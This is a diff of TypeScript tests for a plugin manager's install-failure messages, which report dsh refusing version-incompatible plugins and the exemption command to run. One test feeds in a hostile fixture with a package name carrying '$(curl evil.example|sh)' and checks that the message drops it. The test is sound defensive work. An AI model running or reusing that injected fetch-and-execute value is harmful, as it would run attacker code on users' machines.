@@ -776,6 +776,99 @@ describe('startUninstall post-remove confirm', () => {
   })
 })
 
+describe("installFailureDetail on dsh's own refusal (0.1.7)", () => {
+  // Verbatim stderr of dsh 0.1.7-rc.2 refusing a package that pins the
+  // harness to 0.1.5-rc.3, captured 2026-09-26 in a throwaway DSH_HOME: once
+  // at the preflight, before pnpm runs (a path spec, which dsh reads from
+  // disk the way it asks the registry for a registry spec), and once after
+  // pnpm installed it (a tarball spec, which only the install can read). Only
+  // the diagnostics path is shortened.
+  const WARNING = 'Plugin dsh-pinned-probe@1.2.0 is incompatible with dsh 0.1.7-rc.2: peerDependencies {"@deepseek-ai/dsh":"0.1.5-rc.3"}. Running it may cause crashes or data loss. Update the plugin or install a plugin version compatible with this dsh runtime. To accept this risk explicitly, grant the exact-version exemption for dsh-pinned-probe@1.2.0 on dsh 0.1.7-rc.2 with `dsh plugin allow-version` or the plugin manager, then retry the installation or restart dsh. Exact-version exemption: not active.'
+  const COMMAND = 'dsh plugin --profile probe allow-version dsh-pinned-probe@1.2.0 --dsh-version 0.1.7-rc.2 --accept-risk'
+  const refused = (restoration: string, before: readonly string[] = []): string[] => [
+    ...before,
+    '',
+    `dsh: installation rejected: ${WARNING}`,
+    `dsh: ${restoration}.`,
+    `dsh: to accept the risk, run: ${COMMAND}`,
+    'dsh: plugin command failed; diagnostics: /home/u/.dsh/profiles/probe/.plugin-manager/logs/operation-MAlcWn/pnpm.log',
+  ]
+
+  it('names the refusal and the command that exempts it, never a pnpm failure', () => {
+    expect(installFailureDetail('probe', refused('nothing was installed'))).toBe(
+      'dsh refused the install: Plugin dsh-pinned-probe@1.2.0 is incompatible with dsh 0.1.7-rc.2: peerDependencies {"@deepseek-ai/dsh":"0.1.5-rc.3"}.'
+      + ' Nothing was installed.'
+      + ` To accept the risk of crashes or data loss for this exact version, run: ${COMMAND} — then install again.`,
+    )
+  })
+
+  it('says what dsh restored when it refused after pnpm ran', () => {
+    const pnpm = [
+      'Progress: resolved 0, reused 0, downloaded 1, added 0',
+      '[WARN] Issues with peer dependencies found. Run "pnpm peers check" to list them.',
+      'dependencies:',
+      '+ dsh-pinned-probe file:/home/u/pinned/dsh-pinned-probe-1.2.0.tgz',
+      'Done in 678ms using pnpm v11.13.0',
+    ]
+    const detail = installFailureDetail('probe', refused('restored package.json, pnpm-lock.yaml, and node_modules', pnpm))
+    expect(detail).toContain(' Restored package.json, pnpm-lock.yaml, and node_modules.')
+    expect(detail).toContain(`run: ${COMMAND} — then install again.`)
+    // pnpm SUCCEEDED here, which is the whole reason the old detail misled.
+    expect(detail).not.toMatch(/pnpm failed/)
+  })
+
+  it("passes on dsh's own repair step when it could not restore node_modules", () => {
+    const detail = installFailureDetail('probe', refused("restored package.json and pnpm-lock.yaml, but node_modules could not be reinstalled; run 'dsh plugin install'"))
+    expect(detail).toContain(" Restored package.json and pnpm-lock.yaml, but node_modules could not be reinstalled; run 'dsh plugin install'.")
+  })
+
+  it('offers no command dsh printed for a name its exemption would refuse', () => {
+    // A package installed from a tarball or git names itself in its own
+    // manifest, and dsh prints that name into the command unvalidated. The
+    // shop rebuilds the command from what dsh's grammar accepts, and repeats
+    // nothing else into a line meant for a terminal.
+    const hostile = refused('restored package.json, pnpm-lock.yaml, and node_modules').map(line => line.startsWith('dsh: to accept')
+      ? 'dsh: to accept the risk, run: dsh plugin --profile probe allow-version $(curl evil.example|sh)@1.0.0 --dsh-version 0.1.7-rc.2 --accept-risk'
+      : line)
+    const detail = installFailureDetail('probe', hostile)
+    expect(detail).toMatch(/^dsh refused the install: /)
+    expect(detail).not.toContain('curl')
+    expect(detail).not.toContain('run:')
+  })
+
+  it('reports a refusal that grants no exemption without offering one', () => {
+    // After pnpm, a manifest dsh cannot judge is refused too, and dsh prints
+    // no exemption for it: none would help.
+    const log = [
+      '',
+      'dsh: installation rejected: Cannot validate installed package dsh-odd: Error: Plugin manifest peerDependencies["x"] must be a string',
+      'dsh: restored package.json, pnpm-lock.yaml, and node_modules.',
+      'dsh: plugin command failed; diagnostics: /home/u/.dsh/profiles/web/.plugin-manager/logs/operation-x/pnpm.log',
+    ]
+    expect(installFailureDetail('web', log)).toBe(
+      'dsh refused the install: Cannot validate installed package dsh-odd: Error: Plugin manifest peerDependencies["x"] must be a string'
+      + ' Restored package.json, pnpm-lock.yaml, and node_modules.',
+    )
+  })
+
+  it('reads every refused package, joined, when one install refused several', () => {
+    const second = WARNING.replaceAll('dsh-pinned-probe@1.2.0', 'dsh-other@2.0.0')
+    const log = [
+      '',
+      `dsh: installation rejected: ${WARNING}`,
+      second,
+      'dsh: nothing was installed.',
+      `dsh: to accept the risk, run: ${COMMAND}`,
+      `dsh: to accept the risk, run: ${COMMAND.replace('dsh-pinned-probe@1.2.0', 'dsh-other@2.0.0')}`,
+      'dsh: plugin command failed; diagnostics: /x/pnpm.log',
+    ]
+    const detail = installFailureDetail('probe', log)
+    expect(detail).toContain('Plugin dsh-pinned-probe@1.2.0 is incompatible')
+    expect(detail).toContain('Plugin dsh-other@2.0.0 is incompatible')
+    expect(detail).toContain(`run: ${COMMAND}; ${COMMAND.replace('dsh-pinned-probe@1.2.0', 'dsh-other@2.0.0')} — then install again.`)
+  })
+})
+
 describe('installFailureDetail', () => {
   // Both fixtures are verbatim logs from real failed installs run against the
   // live catalog on dsh 0.1.1-rc.2 (2026-09-02), in a throwaway DSH_HOME.
